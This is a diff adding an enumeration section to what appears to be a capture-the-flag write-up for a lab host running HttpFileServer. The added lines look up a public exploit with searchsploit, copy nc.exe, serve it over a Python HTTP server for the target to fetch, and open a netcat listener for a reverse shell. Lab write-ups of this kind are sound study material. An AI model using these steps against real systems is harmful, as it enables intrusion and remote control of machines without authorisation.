@@ -25,6 +25,26 @@ sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.8 --open
 
 
 ## Enumeration
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7b8a57ae-f7cc-4fee-a4bb-d9d8ae1f2ddb)
+
+```
+searchsploit httpfileserver
+
+searchsploit -m 49125
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/93e024da-a49f-4962-99db-5f8d93e10d7e)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9449a98a-3a39-469c-a5ba-c2a2b311393d)
+
+```
+cp /usr/share/windows-binaries/nc.exe .
+
+sudo python3 -m http.server
+
+nc -nlvp 4444
+```
+
 
 
 
